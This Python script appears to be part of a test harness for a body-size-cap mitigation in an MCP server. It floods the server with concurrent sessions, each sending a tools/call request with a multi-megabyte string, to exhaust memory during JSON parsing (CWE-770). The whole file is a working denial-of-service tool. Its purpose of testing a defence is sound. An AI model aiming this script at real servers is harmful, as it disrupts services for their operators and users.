"""
Vector 1 -- Oversized message body (CWE-770), Streamable HTTP transport.

Sends `concurrency` concurrent tools/call requests to the reference server,
each carrying a single JSON string argument of `size_mb` megabytes. With the
body-size-cap mitigation OFF, the server must buffer + JSON-parse the whole
payload (with Python's per-object overhead this costs several times the
raw byte count in RSS). With the mitigation ON, oversized requests are
rejected the moment the streamed byte count crosses the cap, before
JSON-parsing ever happens.

Usage: python attack.py <base_url> <size_mb> <concurrency> [timeout_s]
Prints a one-line JSON summary of {sent_bytes, ok, failed, elapsed_s} to
stdout so the smoke-test driver can capture attacker-side cost.
"""
from __future__ import annotations

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import httpx

sys.path.insert(0, "../../common") if False else None


def initialize(base_url: str) -> str | None:
    body = {
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                   "clientInfo": {"name": "attacker", "version": "1.0"}},
    }
    with httpx.Client(timeout=10.0) as c:
        r = c.post(f"{base_url}/mcp", json=body,
                   headers={"Accept": "application/json, text/event-stream"})
        sid = r.headers.get("mcp-session-id")
        if sid:
            c.post(f"{base_url}/mcp",
                   json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                   headers={"mcp-session-id": sid, "Accept": "application/json, text/event-stream"})
        return sid


def send_one(base_url: str, payload: str, timeout_s: float):
    # Each concurrent worker gets its OWN session (own initialize handshake)
    # rather than sharing one session id. Sharing a session across
    # concurrent requests turned out to serialize on the SDK's per-session
    # transport queue, which would conflate "concurrent independent
    # attackers" with "same-session queueing" -- two different mechanisms.
    # Independent sessions is also the more realistic attacker model.
    sid = initialize(base_url)
    if not sid:
        return "error:init_failed"
    body = {
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": payload}},
    }
    headers = {"mcp-session-id": sid, "Accept": "application/json, text/event-stream",
               "Content-Type": "application/json"}
    try:
        with httpx.Client(timeout=timeout_s) as c:
            r = c.post(f"{base_url}/mcp", json=body, headers=headers)
            return r.status_code
    except httpx.HTTPError as e:
        return f"error:{type(e).__name__}"


def main():
    base_url = sys.argv[1]
    size_mb = float(sys.argv[2])
    concurrency = int(sys.argv[3])
    timeout_s = float(sys.argv[4]) if len(sys.argv) > 4 else 15.0

    payload = "A" * int(size_mb * 1024 * 1024)
    sent_bytes = len(payload.encode()) * concurrency

    t0 = time.perf_counter()
    results = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(send_one, base_url, payload, timeout_s) for _ in range(concurrency)]
        for f in futs:
            results.append(f.result())
    elapsed = time.perf_counter() - t0

    ok = sum(1 for r in results if r == 200)
    failed = concurrency - ok
    print(json.dumps({"sent_bytes": sent_bytes, "ok": ok, "failed": failed,
                       "elapsed_s": elapsed, "statuses": [str(r) for r in results]}))


if __name__ == "__main__":
    main()
